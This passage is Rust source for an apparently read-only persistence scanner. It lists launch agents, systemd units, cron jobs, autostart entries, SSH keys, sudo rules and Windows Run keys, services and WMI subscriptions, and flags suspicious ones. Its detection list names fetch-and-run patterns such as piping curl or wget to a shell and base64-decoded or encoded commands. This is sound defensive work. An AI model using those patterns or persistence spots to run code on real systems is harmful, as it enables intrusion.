//! Persistence analysis: everything configured to start automatically —
//! launch agents/daemons, services, scheduled tasks, cron, autostart
//! entries, kernel/system extensions and drivers, shell start-up files —
//! with the target executable's hash, signature and suspicion flags.
//!
//! Read-only: nothing is changed, disabled or removed.

use std::path::{Path, PathBuf};
use std::time::{Duration, SystemTime};

use chrono::{DateTime, Local};
use serde::Serialize;

use crate::fileinfo;
use crate::inspect::{self, SignatureStatus};

#[derive(Debug, Clone, Serialize)]
pub struct Item {
    pub category: String,
    pub name: String,
    pub command: String,
    /// Executable (or file) the entry runs, when it can be resolved.
    pub target: Option<String>,
    /// Where the entry is defined (plist, unit file, registry key…).
    pub location: String,
    /// "system" or "user".
    pub scope: String,
    pub enabled: Option<bool>,
    pub detail: String,
    pub sha256: Option<String>,
    pub signature: Option<String>,
    pub modified: Option<String>,
    /// When the definition itself (plist, unit file, crontab…) was last
    /// written, RFC 3339 — when the entry was added or changed.
    pub defined: Option<String>,
    /// Reasons this entry deserves a closer look.
    pub flags: Vec<String>,
}

impl Item {
    fn new(category: &str, name: impl Into<String>, command: impl Into<String>, location: impl Into<String>, scope: &str) -> Self {
        Item {
            category: category.into(),
            name: name.into(),
            command: command.into(),
            target: None,
            location: location.into(),
            scope: scope.into(),
            enabled: None,
            detail: String::new(),
            sha256: None,
            signature: None,
            modified: None,
            defined: None,
            flags: Vec::new(),
        }
    }

    #[cfg(test)]
    pub fn test(category: &str, name: &str, command: &str, location: &str) -> Self {
        Item::new(category, name, command, location, "user")
    }

    pub fn suspicious(&self) -> bool {
        !self.flags.is_empty()
    }
}

pub struct Scan {
    pub items: Vec<Item>,
    pub notes: Vec<String>,
}

/// Enumerate and enrich every persistence entry. Takes seconds (signature
/// checks), so it runs on a worker.
pub fn scan() -> Scan {
    scan_with(&std::collections::HashMap::new())
}

/// Like [`scan`], reusing signature/hash results already known for
/// running executables instead of checking them again.
pub fn scan_with(known: &std::collections::HashMap<String, crate::intel::ExeInfo>) -> Scan {
    let mut notes = Vec::new();
    let mut items = imp::collect(&mut notes);
    for it in items.iter_mut() {
        if it.target.is_none() {
            it.target = extract_target(&it.command);
        }
    }
    // Hashing and signature checks are independent per entry: spread them
    // over a few threads.
    let chunk = items.len().div_ceil(6).max(1);
    std::thread::scope(|s| {
        for part in items.chunks_mut(chunk) {
            s.spawn(move || part.iter_mut().for_each(|it| enrich(it, known)));
        }
    });
    let mut seen = std::collections::HashSet::new();
    items.retain(|i| seen.insert((i.category.clone(), i.name.clone(), i.target.clone(), i.location.clone())));
    items.sort_by(|a, b| {
        b.suspicious().cmp(&a.suspicious()).then(a.category.cmp(&b.category)).then(a.name.to_lowercase().cmp(&b.name.to_lowercase()))
    });
    Scan { items, notes }
}

/// First executable path in a command line: quoted path, or the first
/// token; bare names are looked up on PATH.
pub fn extract_target(cmd: &str) -> Option<String> {
    let cmd = cmd.trim();
    if cmd.is_empty() {
        return None;
    }
    let raw = if let Some(rest) = cmd.strip_prefix('"') {
        rest.split('"').next()?.to_string()
    } else if cfg!(windows) {
        // Unquoted Windows paths may contain spaces; cut after the extension.
        let lower = cmd.to_lowercase();
        match [".exe", ".dll", ".sys", ".bat", ".cmd", ".ps1", ".vbs", ".js"].iter().filter_map(|e| lower.find(e).map(|i| i + e.len())).min() {
            Some(end) => cmd[..end].to_string(),
            None => cmd.split_whitespace().next()?.to_string(),
        }
    } else {
        cmd.split_whitespace().next()?.to_string()
    };
    let expanded = expand_env(raw.trim_start_matches(r"\??\"));
    if expanded.contains('/') || expanded.contains('\\') {
        return Some(expanded);
    }
    // Bare program name: resolve on PATH.
    std::env::var_os("PATH").and_then(|paths| {
        std::env::split_paths(&paths).map(|d| d.join(&expanded)).find(|p| p.is_file()).map(|p| p.display().to_string())
    })
}

/// Expand `%VAR%` (Windows) and a leading `~` / `$HOME`.
fn expand_env(s: &str) -> String {
    let mut out = s.to_string();
    if let Some(home) = std::env::var_os("HOME").or_else(|| std::env::var_os("USERPROFILE")) {
        let home = home.to_string_lossy().to_string();
        if let Some(rest) = out.strip_prefix('~') {
            out = format!("{home}{rest}");
        }
        out = out.replace("$HOME", &home);
    }
    while let Some(start) = out.find('%') {
        let Some(len) = out[start + 1..].find('%') else { break };
        let name = &out[start + 1..start + 1 + len];
        match std::env::var(name) {
            Ok(v) => out.replace_range(start..start + len + 2, &v),
            Err(_) => break,
        }
    }
    if let Some(rest) = out.strip_prefix(r"\SystemRoot\") {
        if let Ok(root) = std::env::var("SystemRoot") {
            out = format!(r"{root}\{rest}");
        }
    }
    out
}

/// Folders where legitimate auto-start programs rarely live.
pub fn risky_location(path: &str) -> bool {
    let p = path.to_lowercase().replace('\\', "/");
    ["/tmp/", "/private/tmp/", "/var/tmp/", "/private/var/folders/", "/dev/shm/", "/downloads/", "/users/shared/", "/appdata/local/temp/", "/users/public/", "/windows/temp/"]
        .iter()
        .any(|d| p.contains(d))
}

fn enrich(it: &mut Item, known: &std::collections::HashMap<String, crate::intel::ExeInfo>) {
    if let Ok(m) = std::fs::symlink_metadata(&it.location).and_then(|m| m.modified()) {
        it.defined = Some(DateTime::<Local>::from(m).to_rfc3339());
    }
    let lower = it.command.to_lowercase();
    if ["bash -c", "sh -c", "zsh -c", "python -c", "python3 -c", "perl -e", "osascript -e", "-encodedcommand", " -enc ", "frombase64string", "curl ", "wget ", "| sh", "|sh", "base64 -d", "base64 --decode"]
        .iter()
        .any(|k| lower.contains(k))
    {
        it.flags.push("runs an inline script or downloads code".into());
    }
    let Some(target) = it.target.clone() else { return };
    let path = Path::new(&target);
    if risky_location(&target) {
        it.flags.push("runs from a temporary or user-writable folder".into());
    }
    if path.file_name().is_some_and(|n| n.to_string_lossy().starts_with('.')) {
        it.flags.push("hidden file name".into());
    }
    let Ok(meta) = std::fs::metadata(path) else {
        if !target.contains('%') {
            it.flags.push("target file is missing".into());
        }
        return;
    };
    let recently_changed = meta.modified().is_ok_and(|m| SystemTime::now().duration_since(m).unwrap_or_default() < Duration::from_secs(7 * 86_400));
    if let Ok(m) = meta.modified() {
        it.modified = Some(DateTime::<Local>::from(m).format("%Y-%m-%d %H:%M").to_string());
    }
    let cached = known.get(&target).filter(|k| k.exists && k.size == meta.len());
    if let Some(h) = cached.and_then(|k| k.sha256.clone()) {
        it.sha256 = Some(h);
    } else if meta.is_file() && meta.len() < 512 << 20 {
        it.sha256 = fileinfo::sha256_file(path).ok();
    }
    // Signatures mean something for executables, not for text files.
    let kind = fileinfo::file_type(path);
    if kind.contains("executable") || kind.contains("Mach-O") {
        let sig = match cached.filter(|k| k.sig != crate::intel::Sig::Unknown) {
            Some(k) => match k.sig {
                crate::intel::Sig::Signed => SignatureStatus::Valid { signer: k.signer.clone() },
                crate::intel::Sig::Unsigned => SignatureStatus::Unsigned,
                crate::intel::Sig::Invalid => SignatureStatus::Invalid { reason: k.signer.clone() },
                crate::intel::Sig::Unknown => SignatureStatus::Unknown,
            },
            None => inspect::file_signature(&target).0,
        };
        match &sig {
            SignatureStatus::Unsigned => it.flags.push("executable is not signed".into()),
            SignatureStatus::Invalid { .. } => it.flags.push("signature is invalid".into()),
            _ => {}
        }
        let trusted = matches!(sig, SignatureStatus::Valid { .. });
        if sig != SignatureStatus::Unknown {
            it.signature = Some(fileinfo::signature_text(&sig));
        }
        // Signed apps update themselves all the time; a fresh change only
        // matters for code nobody vouches for.
        if recently_changed && !trusted {
            it.flags.push("target changed in the last 7 days".into());
        }
    } else if recently_changed {
        // Scripts, plists, keys, shell profiles: any recent edit is notable.
        it.flags.push("changed in the last 7 days".into());
    }
}

/// Main executable of a .app/.appex/.xpc bundle (from Info.plist), so
/// signatures and hashes are taken from the code, not the folder.
#[allow(dead_code)]
fn bundle_executable(path: &str) -> Option<String> {
    let p = Path::new(path);
    if !p.is_dir() {
        return None;
    }
    let info = plist::Value::from_file(p.join("Contents/Info.plist")).ok()?;
    let exe = info.as_dictionary()?.get("CFBundleExecutable")?.as_string()?.to_string();
    let full = p.join("Contents/MacOS").join(exe);
    full.is_file().then(|| full.display().to_string())
}

fn home() -> PathBuf {
    std::env::var_os("HOME").or_else(|| std::env::var_os("USERPROFILE")).map(PathBuf::from).unwrap_or_default()
}

/// Shell start-up files are a classic persistence spot.
#[allow(dead_code)]
fn shell_profiles(items: &mut Vec<Item>, extra: &[&str]) {
    let h = home();
    let mut files: Vec<PathBuf> =
        [".zshrc", ".zprofile", ".zshenv", ".zlogin", ".bashrc", ".bash_profile", ".profile"].iter().map(|f| h.join(f)).collect();
    files.extend(extra.iter().map(PathBuf::from));
    for f in files.into_iter().filter(|f| f.is_file()) {
        let lines = std::fs::read_to_string(&f).map(|t| t.lines().filter(|l| !l.trim().is_empty() && !l.trim().starts_with('#')).count()).unwrap_or(0);
        let scope = if f.starts_with(&h) { "user" } else { "system" };
        let mut it = Item::new("Shell start-up file", f.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default(), "", f.display().to_string(), scope);
        it.target = Some(f.display().to_string());
        it.detail = format!("{lines} active lines");
        items.push(it);
    }
}

#[allow(dead_code)]
fn cron_lines(items: &mut Vec<Item>, text: &str, location: &str, scope: &str, has_user_field: bool) {
    for line in text.lines().map(str::trim).filter(|l| !l.is_empty() && !l.starts_with('#')) {
        let fields: Vec<&str> = line.split_whitespace().collect();
        if fields.first().is_some_and(|f| f.contains('=')) {
            continue; // VAR=value lines
        }
        let (schedule, rest) = if fields.first().is_some_and(|f| f.starts_with('@')) {
            (fields[0].to_string(), &fields[1..])
        } else if fields.len() > 5 {
            (fields[..5].join(" "), &fields[5..])
        } else {
            continue;
        };
        let rest = if has_user_field && !rest.is_empty() { &rest[1..] } else { rest };
        let cmd = rest.join(" ");
        let mut it = Item::new("Cron job", cmd.split_whitespace().next().unwrap_or("").rsplit('/').next().unwrap_or(""), cmd.clone(), location, scope);
        it.detail = format!("schedule {schedule}");
        it.enabled = Some(true);
        items.push(it);
    }
}

/// Non-default lines of the hosts file: each one silently redirects a
/// name, a classic way to hijack updates or hide C2 behind a real domain.
#[allow(dead_code)]
fn hosts_file(items: &mut Vec<Item>, path: &str) {
    let Ok(text) = std::fs::read_to_string(path) else { return };
    for line in text.lines().map(str::trim).filter(|l| !l.is_empty() && !l.starts_with('#')) {
        let mut f = line.split_whitespace();
        let (Some(ip), names) = (f.next(), f.collect::<Vec<_>>()) else { continue };
        let names: Vec<&str> = names.into_iter().take_while(|n| !n.starts_with('#')).collect();
        let default = names.iter().all(|n| {
            matches!(*n, "localhost" | "broadcasthost" | "localhost.localdomain" | "ip6-localhost" | "ip6-loopback" | "ip6-allnodes" | "ip6-allrouters" | "ip6-localnet" | "ip6-mcastprefix")
        }) || names.is_empty();
        if default {
            continue;
        }
        let mut it = Item::new("Hosts file entry", names.join(" "), line, path, "system");
        it.detail = format!("{} resolves to {ip}", names.join(", "));
        it.flags.push(format!("overrides DNS for {}", names.join(", ")));
        items.push(it);
    }
}

/// Every key in an authorized_keys file lets someone log in without a
/// password.
#[allow(dead_code)]
fn authorized_keys(items: &mut Vec<Item>, path: &Path, scope: &str) {
    let Ok(text) = std::fs::read_to_string(path) else { return };
    for line in text.lines().map(str::trim).filter(|l| !l.is_empty() && !l.starts_with('#')) {
        let parts: Vec<&str> = line.split_whitespace().collect();
        let Some(kpos) = parts.iter().position(|p| p.starts_with("ssh-") || p.starts_with("ecdsa-") || p.starts_with("sk-")) else { continue };
        let comment = parts.get(kpos + 2..).map(|c| c.join(" ")).unwrap_or_default();
        let key = parts.get(kpos + 1).map(|k| format!("…{}", k.chars().rev().take(12).collect::<Vec<_>>().into_iter().rev().collect::<String>())).unwrap_or_default();
        let name = if comment.is_empty() { format!("{} {key}", parts[kpos]) } else { comment };
        let mut it = Item::new("SSH authorized key", name, line.chars().take(120).collect::<String>(), path.display().to_string(), scope);
        it.target = Some(path.display().to_string());
        it.enabled = Some(true);
        if kpos > 0 {
            it.detail = format!("options: {}", parts[..kpos].join(" "));
            if parts[..kpos].iter().any(|o| o.starts_with("command=")) {
                it.flags.push("key forces a command on login".into());
            }
        }
        items.push(it);
    }
}

/// sudo rules granting password-less root (needs root to read).
#[allow(dead_code)]
fn sudoers(items: &mut Vec<Item>, notes: &mut Vec<String>) {
    let mut files = vec![PathBuf::from("/etc/sudoers")];
    if let Ok(r) = std::fs::read_dir("/etc/sudoers.d") {
        files.extend(r.flatten().map(|e| e.path()));
    }
    let mut unreadable = false;
    for f in files {
        let Ok(text) = std::fs::read_to_string(&f) else {
            unreadable = true;
            continue;
        };
        for line in text.lines().map(str::trim).filter(|l| !l.is_empty() && !l.starts_with('#') && !l.starts_with("Defaults")) {
            if !line.contains("NOPASSWD") {
                continue;
            }
            let mut it = Item::new("Sudo rule", line.split_whitespace().next().unwrap_or(""), line, f.display().to_string(), "system");
            it.target = Some(f.display().to_string());
            it.flags.push("grants root without a password".into());
            items.push(it);
        }
    }
    if unreadable {
        notes.push("sudo rules need root to read.".into());
    }
}

// ── macOS ──────────────────────────────────────────────────────────────

#[cfg(target_os = "macos")]
mod imp {
    use super::*;
    use crate::inspect::run_command;
    use std::process::Command;

    fn launchd(items: &mut Vec<Item>, dir: &Path, category: &str, scope: &str) {
        let Ok(entries) = std::fs::read_dir(dir) else { return };
        for e in entries.flatten() {
            let path = e.path();
            if path.extension().is_none_or(|x| x != "plist") {
                continue;
            }
            let Ok(v) = plist::Value::from_file(&path) else { continue };
            let Some(d) = v.as_dictionary() else { continue };
            let label = d.get("Label").and_then(|l| l.as_string()).unwrap_or("").to_string();
            let args: Vec<String> = d
                .get("ProgramArguments")
                .and_then(|a| a.as_array())
                .map(|a| a.iter().filter_map(|x| x.as_string().map(str::to_string)).collect())
                .unwrap_or_default();
            let program = d.get("Program").and_then(|p| p.as_string()).map(str::to_string);
            let command = match (&program, args.is_empty()) {
                (Some(p), true) => p.clone(),
                (Some(p), false) => format!("{p} {}", args[1..].join(" ")),
                (None, _) => args.join(" "),
            };
            let flag = |k: &str| d.get(k).and_then(|v| v.as_boolean()).unwrap_or(false);
            let mut when = Vec::new();
            if flag("RunAtLoad") {
                when.push("at load");
            }
            if d.get("KeepAlive").is_some() {
                when.push("kept alive");
            }
            if d.get("StartInterval").is_some() || d.get("StartCalendarInterval").is_some() {
                when.push("on a schedule");
            }
            if d.get("WatchPaths").is_some() {
                when.push("when files change");
            }
            let name = if label.is_empty() { path.file_stem().map(|s| s.to_string_lossy().into_owned()).unwrap_or_default() } else { label };
            let mut it = Item::new(category, name, command, path.display().to_string(), scope);
            it.target = program.or_else(|| args.first().cloned()).map(|t| expand_env(&t));
            it.enabled = Some(!flag("Disabled"));
            it.detail = if when.is_empty() { "on demand".into() } else { format!("runs {}", when.join(", ")) };
            items.push(it);
        }
    }

    /// Background / login items registered with ServiceManagement
    /// (System Settings › General › Login Items). Launch-daemon/agent
    /// records duplicate the plists scanned above and are skipped.
    fn login_items(items: &mut Vec<Item>, notes: &mut Vec<String>) {
        // Without root, sfltool asks for an administrator password in a
        // dialog — a monitor must never trigger prompts.
        if unsafe { libc::geteuid() } != 0 {
            notes.push("Login items (System Settings › General) are listed when procwatch runs with sudo.".into());
            return;
        }
        let Ok(o) = run_command(Command::new("sfltool").arg("dumpbtm"), Duration::from_secs(20)) else {
            notes.push("login items: sfltool unavailable".into());
            return;
        };
        let text = String::from_utf8_lossy(&o.stdout);
        let mut rec: Vec<(String, String)> = Vec::new();
        let flush = |rec: &mut Vec<(String, String)>, items: &mut Vec<Item>| {
            let get = |k: &str| rec.iter().find(|(a, _)| a == k).map(|(_, v)| v.clone()).filter(|v| v != "(null)");
            let ty = get("Type").unwrap_or_default();
            if let (Some(name), false) = (get("Name"), ty.contains("legacy") || ty.starts_with("developer")) {
                // sfltool writes the home folder as /Users/<uid>/ and
                // sometimes uses file:// URLs.
                let uid = unsafe { libc::getuid() };
                let fix = |p: String| {
                    p.trim_start_matches("file://").replace(&format!("/Users/{uid}/"), &format!("{}/", home().display())).trim_end_matches('/').to_string()
                };
                let exe = get("Executable Path").map(fix);
                let url = get("URL").map(fix).unwrap_or_default();
                let mut it = Item::new("Login / background item", name, exe.clone().unwrap_or_else(|| url.clone()), if url.is_empty() { "Login Items".into() } else { url.clone() }, "user");
                // Plug-ins embedded in another app report paths relative to
                // that app; there's no file to check on their own.
                let candidate = exe.or_else(|| (!url.is_empty()).then(|| url.clone())).filter(|p| p.starts_with('/'));
                it.target = candidate.map(|p| bundle_executable(&p).unwrap_or(p));
                if it.target.is_none() {
                    it.command = String::new();
                }
                let disp = get("Disposition").unwrap_or_default();
                it.enabled = Some(disp.contains("[enabled"));
                it.detail = format!("{} · {}", ty.split(" (").next().unwrap_or(""), get("Developer Name").unwrap_or_else(|| "unknown developer".into()));
                items.push(it);
            }
            rec.clear();
        };
        for line in text.lines() {
            let t = line.trim();
            if line.starts_with(" #") && t.ends_with(':') {
                flush(&mut rec, items);
                continue;
            }
            if let Some((k, v)) = t.split_once(": ") {
                if !k.starts_with('#') {
                    rec.push((k.trim().to_string(), v.trim().to_string()));
                }
            }
        }
        flush(&mut rec, items);
    }

    pub fn collect(notes: &mut Vec<String>) -> Vec<Item> {
        let mut items = Vec::new();
        let h = home();
        launchd(&mut items, Path::new("/Library/LaunchDaemons"), "Launch daemon", "system");
        launchd(&mut items, Path::new("/Library/LaunchAgents"), "Launch agent", "system");
        launchd(&mut items, &h.join("Library/LaunchAgents"), "Launch agent", "user");
        notes.push("Apple's own launch items in /System are protected by SIP and not listed.".into());

        if let Ok(o) = run_command(Command::new("crontab").arg("-l"), Duration::from_secs(5)) {
            cron_lines(&mut items, &String::from_utf8_lossy(&o.stdout), "crontab (current user)", "user", false);
        }
        if let Ok(t) = std::fs::read_to_string("/etc/crontab") {
            cron_lines(&mut items, &t, "/etc/crontab", "system", true);
        }

        // Third-party kernel extensions.
        match run_command(Command::new("kmutil").args(["showloaded", "--list-only"]), Duration::from_secs(20)) {
            Ok(o) => {
                for line in String::from_utf8_lossy(&o.stdout).lines() {
                    let Some(open) = line.find(" (") else { continue };
                    let Some(id) = line[..open].split_whitespace().last() else { continue };
                    if id.starts_with("com.apple.") || !id.contains('.') {
                        continue;
                    }
                    let mut it = Item::new("Kernel extension", id, "", "kmutil showloaded", "system");
                    it.enabled = Some(true);
                    it.detail = line[open..].trim().split(' ').next().unwrap_or("").to_string();
                    items.push(it);
                }
            }
            Err(e) => notes.push(format!("kernel extensions: {e}")),
        }
        // System extensions (network filters, endpoint security, drivers).
        if let Ok(o) = run_command(Command::new("systemextensionsctl").arg("list"), Duration::from_secs(10)) {
            for line in String::from_utf8_lossy(&o.stdout).lines() {
                let cols: Vec<&str> = line.split('\t').map(str::trim).filter(|c| !c.is_empty()).collect();
                // enabled  active  teamID  bundleID (version)  name  [state]
                if cols.len() >= 5 && (cols[0] == "*" || cols[0].is_empty() || cols[1] == "*") {
                    let bundle = cols.iter().find(|c| c.contains('(')).copied().unwrap_or(cols[3]);
                    let mut it = Item::new("System extension", bundle.split(" (").next().unwrap_or(bundle), "", "systemextensionsctl list", "system");
                    it.detail = cols.last().copied().unwrap_or("").to_string();
                    it.enabled = Some(line.contains("activated enabled") || line.trim_start().starts_with('*'));
                    items.push(it);
                }
            }
        }
        shell_profiles(&mut items, &["/etc/zshrc", "/etc/zprofile", "/etc/profile", "/etc/bashrc"]);
        login_items(&mut items, notes);
        for (dir, cat) in [
            ("/Library/StartupItems", "Startup item (legacy)"),
            ("/Library/Security/SecurityAgentPlugins", "Authorization plug-in"),
            ("/etc/emond.d/rules", "Event monitor rule"),
            ("/usr/local/etc/periodic/daily", "Periodic script"),
            ("/usr/local/etc/periodic/weekly", "Periodic script"),
            ("/usr/local/etc/periodic/monthly", "Periodic script"),
            ("/private/var/at/jobs", "at job"),
        ] {
            let Ok(entries) = std::fs::read_dir(dir) else { continue };
            for e in entries.flatten() {
                let name = e.file_name().to_string_lossy().into_owned();
                if name.starts_with('.') && cat != "Event monitor rule" || name == "StagedPlugins" {
                    continue;
                }
                let mut it = Item::new(cat, name, "", dir, "system");
                it.target = Some(e.path().display().to_string());
                if cat == "Authorization plug-in" {
                    it.detail = "loaded by the login / authorization system".into();
                    // Inside a bundle, the code is under Contents/MacOS.
                    if let Ok(mut inner) = std::fs::read_dir(e.path().join("Contents/MacOS")) {
                        if let Some(Ok(bin)) = inner.next() {
                            it.target = Some(bin.path().display().to_string());
                        }
                    }
                }
                if cat != "Authorization plug-in" {
                    it.flags.push(format!("{} are rare and often abused", cat.to_lowercase()));
                }
                items.push(it);
            }
        }
        hosts_file(&mut items, "/etc/hosts");
        authorized_keys(&mut items, &h.join(".ssh/authorized_keys"), "user");
        sudoers(&mut items, notes);
        items
    }
}

// ── Linux ──────────────────────────────────────────────────────────────

#[cfg(target_os = "linux")]
mod imp {
    use super::*;
    use std::fs;

    fn ini_value(text: &str, key: &str) -> Option<String> {
        text.lines().find_map(|l| l.trim().strip_prefix(key).and_then(|r| r.strip_prefix('=')).map(|v| v.trim().to_string()))
    }

    fn units(items: &mut Vec<Item>, dir: &Path, scope: &str) {
        let Ok(entries) = fs::read_dir(dir) else { return };
        for e in entries.flatten() {
            let path = e.path();
            if path.is_dir() {
                // *.wants/ directories hold the enabled units (symlinks).
                units(items, &path, scope);
                continue;
            }
            if path.extension().is_none_or(|x| x != "service" && x != "timer") {
                continue;
            }
            let real = fs::canonicalize(&path).unwrap_or(path.clone());
            let Ok(text) = fs::read_to_string(&real) else { continue };
            let exec = ini_value(&text, "ExecStart").unwrap_or_default();
            let exec = exec.trim_start_matches(['-', '@', '+', '!', ':']).to_string();
            let name = path.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
            if items.iter().any(|i| i.category == "Systemd unit" && i.name == name) {
                continue;
            }
            let mut it = Item::new("Systemd unit", name, exec, real.display().to_string(), scope);
            it.enabled = Some(path.parent().is_some_and(|p| p.to_string_lossy().ends_with(".wants")) || path != real);
            it.detail = ini_value(&text, "Description").unwrap_or_default();
            items.push(it);
        }
    }

    pub fn collect(notes: &mut Vec<String>) -> Vec<Item> {
        let mut items = Vec::new();
        let h = home();
        units(&mut items, Path::new("/etc/systemd/system"), "system");
        units(&mut items, &h.join(".config/systemd/user"), "user");

        if let Ok(t) = fs::read_to_string("/etc/crontab") {
            cron_lines(&mut items, &t, "/etc/crontab", "system", true);
        }
        if let Ok(entries) = fs::read_dir("/etc/cron.d") {
            for e in entries.flatten() {
                if let Ok(t) = fs::read_to_string(e.path()) {
                    cron_lines(&mut items, &t, &e.path().display().to_string(), "system", true);
                }
            }
        }
        if let Ok(o) = crate::inspect::run_command(std::process::Command::new("crontab").arg("-l"), Duration::from_secs(5)) {
            cron_lines(&mut items, &String::from_utf8_lossy(&o.stdout), "crontab (current user)", "user", false);
        }
        for (dir, scope) in [(h.join(".config/autostart"), "user"), (PathBuf::from("/etc/xdg/autostart"), "system")] {
            let Ok(entries) = fs::read_dir(&dir) else { continue };
            for e in entries.flatten() {
                let Ok(t) = fs::read_to_string(e.path()) else { continue };
                let mut it = Item::new(
                    "Autostart",
                    ini_value(&t, "Name").unwrap_or_else(|| e.file_name().to_string_lossy().into_owned()),
                    ini_value(&t, "Exec").unwrap_or_default(),
                    e.path().display().to_string(),
                    scope,
                );
                it.enabled = Some(ini_value(&t, "Hidden").as_deref() != Some("true"));
                items.push(it);
            }
        }
        if let Ok(t) = fs::read_to_string("/proc/modules") {
            for line in t.lines() {
                let f: Vec<&str> = line.split_whitespace().collect();
                if f.is_empty() {
                    continue;
                }
                let mut it = Item::new("Kernel module", f[0], "", "/proc/modules", "system");
                it.enabled = Some(true);
                if line.contains("(O") {
                    it.detail = "out-of-tree module".into();
                }
                if line.contains("(O") || line.contains("E)") || line.contains("(E") {
                    it.flags.push("out-of-tree or unsigned kernel module".into());
                }
                items.push(it);
            }
        }
        for f in ["/etc/ld.so.preload", "/etc/rc.local"] {
            if Path::new(f).is_file() {
                let mut it = Item::new("Boot / loader file", f, "", f, "system");
                it.target = Some(f.into());
                if f.ends_with("preload") && fs::read_to_string(f).is_ok_and(|t| !t.trim().is_empty()) {
                    it.flags.push("libraries are preloaded into every process".into());
                }
                items.push(it);
            }
        }
        let mut profile_d: Vec<String> = fs::read_dir("/etc/profile.d")
            .map(|r| r.flatten().map(|e| e.path().display().to_string()).collect())
            .unwrap_or_default();
        profile_d.push("/etc/profile".into());
        profile_d.push("/etc/bash.bashrc".into());
        let refs: Vec<&str> = profile_d.iter().map(String::as_str).collect();
        shell_profiles(&mut items, &refs);
        if nix_root() {
            for dir in ["/var/spool/cron/crontabs", "/var/spool/cron"] {
                if let Ok(entries) = fs::read_dir(dir) {
                    for e in entries.flatten().filter(|e| e.path().is_file()) {
                        if let Ok(t) = fs::read_to_string(e.path()) {
                            cron_lines(&mut items, &t, &e.path().display().to_string(), "user", false);
                        }
                    }
                }
            }
            authorized_keys(&mut items, Path::new("/root/.ssh/authorized_keys"), "system");
        } else {
            notes.push("Other users' crontabs (/var/spool/cron) and root's SSH keys need root.".into());
        }
        if let Ok(entries) = fs::read_dir("/etc/init.d") {
            for e in entries.flatten() {
                let mut it = Item::new("SysV init script", e.file_name().to_string_lossy(), "", "/etc/init.d", "system");
                it.target = Some(e.path().display().to_string());
                items.push(it);
            }
        }
        if let Ok(entries) = fs::read_dir("/etc/udev/rules.d") {
            for e in entries.flatten() {
                let Ok(t) = fs::read_to_string(e.path()) else { continue };
                for line in t.lines().filter(|l| l.contains("RUN+=") || l.contains("RUN=")) {
                    let cmd = line.split("RUN").nth(1).unwrap_or("").trim_start_matches(['+', '=']).trim().trim_matches('"').to_string();
                    let mut it = Item::new("udev rule", e.file_name().to_string_lossy(), cmd, e.path().display().to_string(), "system");
                    it.flags.push("runs a program when a device event happens".into());
                    items.push(it);
                }
            }
        }
        hosts_file(&mut items, "/etc/hosts");
        authorized_keys(&mut items, &h.join(".ssh/authorized_keys"), "user");
        sudoers(&mut items, notes);
        items
    }

    fn nix_root() -> bool {
        unsafe { libc::geteuid() == 0 }
    }
}

// ── Windows ────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
mod imp {
    use super::*;
    use crate::inspect::run_command;
    use std::process::Command;

    const SCRIPT: &str = r#"
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
function Emit($cat, $name, $cmd, $loc, $scope, $enabled, $detail) {
    Write-Output ((@($cat, $name, $cmd, $loc, $scope, $enabled, $detail) | ForEach-Object { "$_" -replace "`t", " " -replace "`r?`n", " " }) -join "`t")
}
$keys = @(
  @('HKLM:\Software\Microsoft\Windows\CurrentVersion\Run','system'),
  @('HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce','system'),
  @('HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run','system'),
  @('HKCU:\Software\Microsoft\Windows\CurrentVersion\Run','user'),
  @('HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce','user')
)
foreach ($k in $keys) {
  $p = Get-ItemProperty -Path $k[0] -ErrorAction SilentlyContinue
  if ($p) { $p.PSObject.Properties | Where-Object { $_.Name -notlike 'PS*' } | ForEach-Object { Emit 'Run key' $_.Name $_.Value $k[0] $k[1] 'True' '' } }
}
foreach ($f in @(@([Environment]::GetFolderPath('Startup'),'user'), @([Environment]::GetFolderPath('CommonStartup'),'system'))) {
  Get-ChildItem -LiteralPath $f[0] -File -ErrorAction SilentlyContinue | ForEach-Object { Emit 'Startup folder' $_.Name $_.FullName $f[0] $f[1] 'True' '' }
}
Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | ForEach-Object {
  Emit 'Service' $_.Name $_.PathName 'services' 'system' ($_.StartMode -ne 'Disabled') ("$($_.DisplayName) · $($_.State) · $($_.StartMode) · runs as $($_.StartName)")
}
Get-ScheduledTask -ErrorAction SilentlyContinue | ForEach-Object {
  $t = $_
  foreach ($a in $t.Actions) { if ($a.Execute) { Emit 'Scheduled task' ($t.TaskPath + $t.TaskName) ("$($a.Execute) $($a.Arguments)") 'Task Scheduler' $(if ($t.TaskPath -like '\Microsoft\*') {'system'} else {'user'}) ($t.State -ne 'Disabled') "$($t.State)" } }
}
Get-CimInstance Win32_SystemDriver -ErrorAction SilentlyContinue | Where-Object { $_.State -eq 'Running' } | ForEach-Object {
  Emit 'Driver' $_.Name $_.PathName 'drivers' 'system' 'True' ("$($_.DisplayName) · $($_.StartMode)")
}
$wl = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -ErrorAction SilentlyContinue
if ($wl) { foreach ($v in @('Shell','Userinit')) { Emit 'Winlogon value' $v $wl.$v 'HKLM\...\Winlogon' 'system' 'True' '' } }
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options' -ErrorAction SilentlyContinue | ForEach-Object {
  $d = (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).Debugger
  if ($d) { Emit 'IFEO debugger' $_.PSChildName $d 'Image File Execution Options' 'system' 'True' 'runs instead of the program' }
}
$ai = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows' -ErrorAction SilentlyContinue
if ($ai -and $ai.AppInit_DLLs) { Emit 'AppInit DLL' 'AppInit_DLLs' $ai.AppInit_DLLs 'HKLM\...\Windows' 'system' ($ai.LoadAppInit_DLLs -eq 1) 'loaded into every GUI process' }
try {
  Get-CimInstance -Namespace root\subscription -ClassName __EventConsumer -ErrorAction Stop | ForEach-Object {
    $cmd = if ($_.CommandLineTemplate) { $_.CommandLineTemplate } elseif ($_.ScriptText) { $_.ScriptText } else { $_.__CLASS }
    Emit 'WMI subscription' $_.Name $cmd 'root\subscription' 'system' 'True' $_.__CLASS
  }
